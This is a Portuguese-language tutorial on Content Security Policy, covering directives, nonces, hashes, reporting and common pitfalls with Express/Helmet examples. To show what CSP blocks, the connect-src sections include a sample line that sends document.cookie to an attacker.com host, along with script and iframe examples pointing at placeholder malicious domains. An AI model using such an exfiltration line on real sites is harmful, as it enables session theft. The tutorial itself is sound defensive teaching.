# Content Security Policy (CSP): Uma Análise Conceitual Profunda

## 🎯 Introdução e Definição

### Definição Conceitual

**Content Security Policy (CSP)** é um **security mechanism** baseado em **HTTP header** que permite servidores **declararem whitelist de sources** confiáveis para diferentes tipos de recursos (scripts, styles, images, fonts), prevenindo **XSS attacks** ao **bloquear execução de código inline** e **restringir carregamento de resources** a domínios autorizados. **CSP** funciona via **Content-Security-Policy header** (ou meta tag) contendo **directives** (script-src, style-src, img-src, connect-src) que especificam **allowed sources** - browser **aplica policy** rejeitando resources que violam regras, **reportando violations** opcionalmente.

Conceitualmente, CSP é **defense-in-depth layer**: mesmo se **XSS vulnerability** existe (sanitização falhou), **CSP bloqueia execução** de scripts inline (`<script>alert(1)</script>`), scripts de domínios não-autorizados (`<script src="https://evil.com/malicious.js">`), event handlers inline (`<div onclick="...">`). CSP suporta **nonce** (number used once - token único por request) e **hash** (SHA-256/384/512 de script) para permitir **inline scripts específicos** sem comprometer security.

```javascript
// CSP Header Example:
// Content-Security-Policy: 
//   default-src 'self'; 
//   script-src 'self' https://trusted-cdn.com; 
//   style-src 'self' 'unsafe-inline'; 
//   img-src * data:; 
//   connect-src 'self' https://api.example.com

// Efeitos:
// ✅ Permitido: <script src="/js/app.js"></script> (self)
// ✅ Permitido: <script src="https://trusted-cdn.com/lib.js"></script>
// ❌ Bloqueado: <script>alert('XSS')</script> (inline sem nonce)
// ❌ Bloqueado: <script src="https://evil.com/bad.js"></script> (domain não autorizado)
// ❌ Bloqueado: <div onclick="alert(1)"> (inline event handler)

// Browser console:
// Refused to execute inline script because it violates the following 
// Content Security Policy directive: "script-src 'self' https://trusted-cdn.com"

// Backend (Express + Helmet):
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "https://trusted-cdn.com"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'*'", "data:"],
    connectSrc: ["'self'", "https://api.example.com"]
  }
}));
```

### Contexto Histórico e Motivação

**Evolução de CSP:**

1. **CSP 1.0 (2012)**: Primeiro spec (W3C), directives básicas
2. **CSP 2.0 (2015)**: Nonce, hash, inline scripts granulares
3. **CSP 3.0 (2018)**: strict-dynamic, report-to, worker-src
4. **Modern (2020+)**: Trusted Types (DOM XSS prevention)

**Motivação para CSP:**

**XSS** é vulnerabilidade **prevalente** (~40% sites afetados) e **impactante** (session hijacking, data theft). Sanitização de input/output é **primeira linha de defesa** mas **pode falhar** (bypasses, bugs). CSP adiciona **segunda linha de defesa**: mesmo se XSS payload injected, **browser bloqueia execução**. CSP também previne **data exfiltration** (connect-src limita fetch/XHR targets), **clickjacking** (frame-ancestors), **mixed content** (upgrade-insecure-requests).

### Problema Fundamental que Resolve

CSP resolve problemas críticos de web security:

**1. XSS Mitigation**: Bloquear inline scripts e scripts de domínios maliciosos
**2. Data Exfiltration**: Restringir fetch/XHR a APIs autorizadas (connect-src)
**3. Clickjacking**: Prevenir embedding em iframes maliciosos (frame-ancestors)
**4. Mixed Content**: Forçar HTTPS para todos resources (upgrade-insecure-requests)
**5. Visibility**: Reportar violations para monitoring (report-uri/report-to)

### Importância no Ecossistema

CSP é **recomendado** por:

- **OWASP**: Defesa contra XSS (Top 10)
- **Google**: Strict CSP com nonce/hash
- **Mozilla**: Security best practice
- **PCI DSS**: Compliance para payment applications

**Adoção**: ~15% sites (2023), crescendo em enterprise/security-conscious orgs.

---

## 📋 Sumário Conceitual

### Aspectos Teóricos Centrais

1. **CSP Header**: Content-Security-Policy com directives
2. **Directives**: script-src, style-src, img-src, connect-src, etc.
3. **Source Values**: 'self', domain, 'unsafe-inline', 'unsafe-eval', nonce, hash
4. **Nonce**: Token único por request para inline scripts
5. **Report-Only Mode**: Testar policy sem bloquear (report violations)

### Pilares Fundamentais

- **default-src**: Fallback para outras directives
- **script-src**: Sources para JavaScript
- **style-src**: Sources para CSS
- **img-src**: Sources para images
- **connect-src**: Sources para fetch/XHR/WebSocket
- **frame-ancestors**: Quem pode embed em iframe (clickjacking prevention)

### Visão Geral das Nuances

- **'self'**: Same-origin apenas
- **'unsafe-inline'**: Permite inline scripts/styles (⚠️ insecure)
- **'unsafe-eval'**: Permite eval() (⚠️ insecure)
- **nonce-{token}**: Permite inline script com nonce específico
- **sha256-{hash}**: Permite inline script com hash específico
- **strict-dynamic**: Permite scripts carregados por scripts trusted

---

## 🧠 Fundamentos Teóricos

### CSP Directives: script-src

```javascript
// script-src: Controla sources de JavaScript

// Backend:
app.use(helmet.contentSecurityPolicy({
  directives: {
    scriptSrc: [
      "'self'",                        // Same-origin scripts
      "https://cdn.jsdelivr.net",      // CDN específico
      "https://www.google-analytics.com" // Analytics
    ]
  }
}));

// Response header:
// Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net https://www.google-analytics.com

// HTML:
// ✅ Permitido:
<script src="/js/app.js"></script>
<script src="https://cdn.jsdelivr.net/npm/react@18/umd/react.production.min.js"></script>
<script src="https://www.google-analytics.com/analytics.js"></script>

// ❌ Bloqueado:
<script src="https://evil.com/malicious.js"></script>
// Browser: Refused to load script (CSP directive violated)

// ❌ Bloqueado (inline):
<script>
  console.log('Inline script blocked');
</script>
// Browser: Refused to execute inline script (violates CSP)

// ❌ Bloqueado (event handler):
<button onclick="alert(1)">Click</button>
// Browser: Refused to execute inline event handler (violates CSP)
```

### CSP with Nonce (Inline Scripts)

```javascript
// Nonce: Number used once - token único por request

// Backend:
const crypto = require('crypto');

app.use((req, res, next) => {
  // Gerar nonce único
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(helmet.contentSecurityPolicy({
  directives: {
    scriptSrc: [
      "'self'",
      (req, res) => `'nonce-${res.locals.nonce}'` // Nonce dinâmico
    ]
  }
}));

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <script nonce="${res.locals.nonce}">
          // ✅ Inline script com nonce - permitido
          console.log('Inline script with nonce');
        </script>
      </head>
      <body>
        <script nonce="${res.locals.nonce}">
          // ✅ Outro inline script com nonce - permitido
          document.body.innerHTML = '<h1>CSP with Nonce</h1>';
        </script>
        
        <script>
          // ❌ Inline script SEM nonce - bloqueado
          alert('This will be blocked');
        </script>
      </body>
    </html>
  `);
});

// Response header:
// Content-Security-Policy: script-src 'self' 'nonce-abc123...'

// Proteção:
// Atacante injeta XSS:
<script>alert('XSS')</script>

// Browser bloqueia (sem nonce válido)
// Apenas scripts com nonce correto executam
```

### CSP with Hash (Inline Scripts)

```javascript
// Hash: SHA-256/384/512 do script content

// Calcular hash do script:
const crypto = require('crypto');

const scriptContent = "console.log('Inline script');";
const hash = crypto
  .createHash('sha256')
  .update(scriptContent)
  .digest('base64');

console.log(`sha256-${hash}`);
// sha256-xyz123...

// Backend:
app.use(helmet.contentSecurityPolicy({
  directives: {
    scriptSrc: [
      "'self'",
      "'sha256-xyz123...'" // Hash do script específico
    ]
  }
}));

// HTML:
<script>console.log('Inline script');</script>
<!-- ✅ Permitido (hash match) -->

<script>alert('XSS');</script>
<!-- ❌ Bloqueado (hash diferente) -->

// Uso:
// - Hash é fixo (bom para scripts estáticos)
// - Mudança no script requer recalcular hash e atualizar CSP
// - Nonce é preferível para scripts dinâmicos
```

### CSP Directives: style-src, img-src, connect-src

```javascript
// style-src: CSS sources
app.use(helmet.contentSecurityPolicy({
  directives: {
    styleSrc: [
      "'self'",
      "https://fonts.googleapis.com",
      "'unsafe-inline'" // ⚠️ Permite inline styles (comum para compatibility)
    ]
  }
}));

// ✅ Permitido:
<link rel="stylesheet" href="/css/app.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
<style>body { margin: 0; }</style>

// ❌ Bloqueado:
<link rel="stylesheet" href="https://evil.com/malicious.css">

// img-src: Image sources
app.use(helmet.contentSecurityPolicy({
  directives: {
    imgSrc: [
      "'self'",
      "https://cdn.example.com",
      "data:", // Data URIs (base64 images)
      "https:"  // Qualquer HTTPS image
    ]
  }
}));

// ✅ Permitido:
<img src="/images/logo.png">
<img src="https://cdn.example.com/photo.jpg">
<img src="data:image/png;base64,...">

// ❌ Bloqueado:
<img src="http://insecure.com/image.jpg"> // HTTP (não HTTPS)

// connect-src: Fetch/XHR/WebSocket targets
app.use(helmet.contentSecurityPolicy({
  directives: {
    connectSrc: [
      "'self'",
      "https://api.example.com",
      "wss://websocket.example.com"
    ]
  }
}));

// ✅ Permitido:
fetch('/api/users'); // Same-origin
fetch('https://api.example.com/data');
new WebSocket('wss://websocket.example.com');

// ❌ Bloqueado:
fetch('https://evil.com/steal');
// Browser: Refused to connect (violates CSP connect-src)

// XSS data exfiltration bloqueado:
<script>
  fetch('https://attacker.com/steal?data=' + document.cookie);
  // ❌ Bloqueado por connect-src
</script>
```

### CSP Directives: frame-ancestors (Clickjacking Prevention)

```javascript
// frame-ancestors: Controla quem pode embed site em iframe

app.use(helmet.contentSecurityPolicy({
  directives: {
    frameAncestors: ["'self'"] // Apenas same-origin pode iframe
  }
}));

// Response header:
// Content-Security-Policy: frame-ancestors 'self'

// Proteção:
// Site malicioso tenta clickjacking:
// https://attacker.com/phishing.html
<iframe src="https://bank.com/transfer"></iframe>

// Browser bloqueia (violates frame-ancestors)
// bank.com não carrega no iframe

// Alternativas:
// frameAncestors: ["'none'"] - Nenhum iframe permitido
// frameAncestors: ["https://trusted-partner.com"] - Apenas partner específico

// ⚠️ frame-ancestors substitui X-Frame-Options (CSP 2.0+)
```

### CSP: upgrade-insecure-requests

```javascript
// upgrade-insecure-requests: Forçar HTTPS para todos resources

app.use(helmet.contentSecurityPolicy({
  directives: {
    upgradeInsecureRequests: [] // Empty array (directive sem valor)
  }
}));

// Response header:
// Content-Security-Policy: upgrade-insecure-requests

// HTML (com HTTP URLs):
<img src="http://example.com/image.jpg">
<script src="http://example.com/script.js"></script>

// Browser automaticamente upgrade para HTTPS:
// Requests:
//   GET https://example.com/image.jpg (upgraded)
//   GET https://example.com/script.js (upgraded)

// Benefício: Mixed content prevention (HTTPS page + HTTP resources)
```

### CSP: Report-Only Mode

```javascript
// Content-Security-Policy-Report-Only: Testar policy sem bloquear

app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy-Report-Only',
    "default-src 'self'; script-src 'self' https://cdn.example.com; report-uri /csp-violation-report"
  );
  next();
});

// Efeito:
// - Violations são REPORTADAS (não bloqueadas)
// - Browser envia POST para /csp-violation-report
// - Permite testar CSP antes de deploy production

// Violation report (JSON):
app.post('/csp-violation-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  const report = req.body['csp-report'];
  
  console.log('CSP Violation:', {
    documentUri: report['document-uri'],
    violatedDirective: report['violated-directive'],
    blockedUri: report['blocked-uri'],
    sourceFile: report['source-file'],
    lineNumber: report['line-number']
  });
  
  // Log para monitoring/analytics
  
  res.status(204).send();
});

// Exemplo violation report:
// {
//   "csp-report": {
//     "document-uri": "https://example.com/page",
//     "violated-directive": "script-src 'self' https://cdn.example.com",
//     "blocked-uri": "https://evil.com/malicious.js",
//     "source-file": "https://example.com/page",
//     "line-number": 42
//   }
// }

// Workflow:
// 1. Deploy CSP-Report-Only
// 2. Monitor violations
// 3. Ajustar policy
// 4. Deploy Content-Security-Policy (blocking)
```

---

## 🔍 Análise Conceitual Profunda

### Pattern 1: Strict CSP (Google Recommendation)

```javascript
// Strict CSP: Nonce-based + strict-dynamic

app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(helmet.contentSecurityPolicy({
  directives: {
    scriptSrc: [
      (req, res) => `'nonce-${res.locals.nonce}'`,
      "'strict-dynamic'" // Scripts carregados por trusted scripts são trusted
    ],
    objectSrc: ["'none'"],
    baseUri: ["'self'"]
  }
}));

// HTML:
<script nonce="${nonce}" src="https://cdn.example.com/app.js"></script>

// app.js pode carregar outros scripts (trusted):
const script = document.createElement('script');
script.src = 'https://cdn.example.com/module.js';
document.head.appendChild(script);
// ✅ Permitido (strict-dynamic: carregado por script trusted)

// Benefício:
// - Não precisa listar todos CDN domains
// - Scripts trusted podem carregar dependências dinamicamente
// - Mantém proteção contra XSS inline
```

### Pattern 2: React/SPA CSP

```javascript
// CSP para SPAs (React, Vue, Angular)

// Backend:
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: [
      "'self'",
      (req, res) => `'nonce-${res.locals.nonce}'`
    ],
    styleSrc: [
      "'self'",
      "'unsafe-inline'" // React inline styles (styled-components, emotion)
    ],
    imgSrc: [
      "'self'",
      "data:", // Base64 images
      "https:" // CDN images
    ],
    connectSrc: [
      "'self'",
      "https://api.example.com",
      "wss://websocket.example.com"
    ],
    fontSrc: [
      "'self'",
      "https://fonts.gstatic.com"
    ]
  }
}));

// HTML (server-rendered React):
app.get('/', (req, res) => {
  const app = renderToString(<App />);
  
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <meta charset="UTF-8">
      </head>
      <body>
        <div id="root">${app}</div>
        <script nonce="${res.locals.nonce}" src="/js/bundle.js"></script>
      </body>
    </html>
  `);
});

// Webpack config (inject nonce em React):
// window.__webpack_nonce__ = document.querySelector('script[nonce]').nonce;
```

### Pattern 3: CSP with Service Workers

```javascript
// CSP para Service Workers

app.use(helmet.contentSecurityPolicy({
  directives: {
    scriptSrc: ["'self'"],
    workerSrc: ["'self'"], // Service Worker source
    connectSrc: [
      "'self'",
      "https://api.example.com"
    ]
  }
}));

// Service Worker (sw.js):
self.addEventListener('fetch', (event) => {
  // ✅ Fetch permitido (connectSrc: 'self' e api.example.com)
  event.respondWith(
    fetch(event.request)
      .catch(() => caches.match(event.request))
  );
});

// ❌ Bloqueado se workerSrc não inclui origin:
navigator.serviceWorker.register('https://cdn.example.com/sw.js');
// Refused to load service worker (violates CSP)
```

### Pattern 4: CSP Reporting & Monitoring

```javascript
// CSP com report-uri e report-to (modern)

app.use((req, res, next) => {
  // report-to (CSP 3.0 - substituindo report-uri)
  res.setHeader('Report-To', JSON.stringify({
    group: 'csp-endpoint',
    max_age: 10886400, // 126 days
    endpoints: [
      { url: 'https://example.com/csp-reports' }
    ]
  }));
  
  next();
});

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    reportUri: ['/csp-violation'], // Deprecated (fallback)
    reportTo: 'csp-endpoint'        // Modern
  }
}));

// Monitoring endpoint:
app.post('/csp-reports', express.json({ type: 'application/reports+json' }), (req, res) => {
  req.body.forEach(report => {
    console.error('CSP Violation:', {
      type: report.type, // 'csp-violation'
      url: report.url,
      body: report.body
    });
    
    // Enviar para logging service (Sentry, Datadog, etc.)
  });
  
  res.status(204).send();
});

// Integration com Sentry:
const Sentry = require('@sentry/node');

app.post('/csp-reports', express.json({ type: 'application/reports+json' }), (req, res) => {
  req.body.forEach(report => {
    if (report.type === 'csp-violation') {
      Sentry.captureMessage('CSP Violation', {
        level: 'warning',
        extra: report.body
      });
    }
  });
  
  res.status(204).send();
});
```

### Pattern 5: CSP Meta Tag (Fallback)

```javascript
// CSP via HTML meta tag (quando não controla server headers)

// ⚠️ Limitações:
// - Não suporta report-uri/report-to
// - Não suporta frame-ancestors
// - Não suporta sandbox

// HTML:
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'">

// Uso:
// - Static sites (GitHub Pages, CDN)
// - Quando backend não permite custom headers
// - Testing CSP antes de server-side implementation
```

### Pattern 6: CSP with Trusted Types (DOM XSS Prevention)

```javascript
// Trusted Types: Prevenir DOM-based XSS (CSP 3.0)

app.use(helmet.contentSecurityPolicy({
  directives: {
    requireTrustedTypesFor: ["'script'"], // Require Trusted Types para scripts
    trustedTypes: ['default', 'myPolicy'] // Allowed policy names
  }
}));

// Frontend:
// ❌ Sem Trusted Types - bloqueado:
element.innerHTML = '<script>alert(1)</script>';
// TypeError: Failed to set 'innerHTML' (requires TrustedHTML)

// ✅ Com Trusted Types - permitido:
const policy = trustedTypes.createPolicy('myPolicy', {
  createHTML: (input) => {
    // Sanitize input
    return DOMPurify.sanitize(input);
  }
});

const trustedHTML = policy.createHTML('<b>Safe HTML</b>');
element.innerHTML = trustedHTML; // ✅ Permitido

// Proteção:
// - Força sanitização explícita
// - Previne accidental innerHTML com user input
// - DOM XSS bloqueado (defense-in-depth)
```

---

## 🎯 Aplicabilidade e Contextos

### Quando Usar CSP

**✅ Production Sites**: Defense-in-depth contra XSS
**✅ Security-Critical Apps**: Banking, healthcare, government
**✅ Compliance**: PCI DSS, HIPAA requirements
**✅ Third-party Content**: Sites com user-generated content

### CSP Deployment Strategy

1. **Report-Only**: Monitorar violations sem bloquear
2. **Whitelist Tuning**: Ajustar directives baseado em reports
3. **Gradual Rollout**: Deploy CSP para % de traffic
4. **Blocking Mode**: Deploy Content-Security-Policy (full enforcement)

---

## ⚠️ Limitações e Considerações Teóricas

### Limitações CSP

**1. Browser Support**: IE não suporta (Edge sim)
**2. Compatibility**: 'unsafe-inline' comum (degrada security)
**3. Third-party Scripts**: Analytics, ads requerem whitelisting
**4. Nonce Complexity**: Requer server-side rendering ou build-time injection
**5. Bypass Risks**: JSONP, AngularJS sandbox bypasses (histórico)

### Armadilhas Comuns

#### Armadilha 1: 'unsafe-inline' (Degrada Proteção)

```javascript
// ❌ FRACO - unsafe-inline permite inline scripts (XSS risk)
app.use(helmet.contentSecurityPolicy({
  directives: {
    scriptSrc: ["'self'", "'unsafe-inline'"]
  }
}));

// XSS não bloqueado:
<script>alert('XSS')</script> // ✅ Executa (unsafe-inline)

// ✅ FORTE - Usar nonce/hash:
app.use(helmet.contentSecurityPolicy({
  directives: {
    scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`]
  }
}));

// XSS bloqueado:
<script>alert('XSS')</script> // ❌ Bloqueado (sem nonce)
```

#### Armadilha 2: Wildcard Sources

```javascript
// ❌ FRACO - Wildcard permite muitos domains
app.use(helmet.contentSecurityPolicy({
  directives: {
    scriptSrc: ["'self'", "https:"] // Qualquer HTTPS domain
  }
}));

// Ataque possível:
<script src="https://attacker.com/malicious.js"></script>
// ✅ Executa (https: permite)

// ✅ FORTE - Listar domains específicos:
app.use(helmet.contentSecurityPolicy({
  directives: {
    scriptSrc: [
      "'self'",
      "https://cdn.jsdelivr.net",
      "https://www.google-analytics.com"
    ]
  }
}));
```

#### Armadilha 3: Esquecer connect-src

```javascript
// ❌ INCOMPLETO - script-src sem connect-src
app.use(helmet.contentSecurityPolicy({
  directives: {
    scriptSrc: ["'self'"]
  }
}));

// XSS data exfiltration NÃO bloqueado:
<script nonce="...">
  fetch('https://attacker.com/steal?data=' + document.cookie);
  // ✅ Funciona (connect-src não restringido)
</script>

// ✅ COMPLETO - Incluir connect-src:
app.use(helmet.contentSecurityPolicy({
  directives: {
    scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
    connectSrc: ["'self'", "https://api.example.com"]
  }
}));

// Data exfiltration bloqueado:
<script nonce="...">
  fetch('https://attacker.com/steal?data=' + document.cookie);
  // ❌ Bloqueado (violates connect-src)
</script>
```

---

## 🔗 Interconexões Conceituais

### Relação com XSS Prevention

**CSP** é **defense-in-depth** layer contra XSS (bloqueia execução mesmo se sanitização falha).

### Relação com CORS

**connect-src** restringe **fetch/XHR targets**, complementando CORS (server-side control).

### Relação com Clickjacking Prevention

**frame-ancestors** substitui **X-Frame-Options** (CSP 2.0+).

---

## 🚀 Evolução e Próximos Conceitos

### Próximos Passos

1. **Security Headers**: X-Frame-Options, HSTS, X-Content-Type-Options
2. **Subresource Integrity (SRI)**: Hash verification para CDN scripts
3. **Trusted Types**: DOM XSS prevention (CSP 3.0)
4. **OWASP Top 10**: Outras vulnerabilidades web

---

## 📚 Conclusão

CSP é **poderosa defesa-em-profundidade** contra XSS e data exfiltration.

Dominar CSP significa:
- **Configurar directives**: script-src, style-src, connect-src, frame-ancestors
- **Usar nonce/hash**: Permitir inline scripts específicos (evitar unsafe-inline)
- **Deploy gradual**: Report-Only → ajustes → blocking mode
- **Monitorar violations**: report-uri/report-to para tuning
- **Evitar armadilhas**: unsafe-inline, wildcards, connect-src esquecido

É essencial para aplicações web security-critical e compliance.
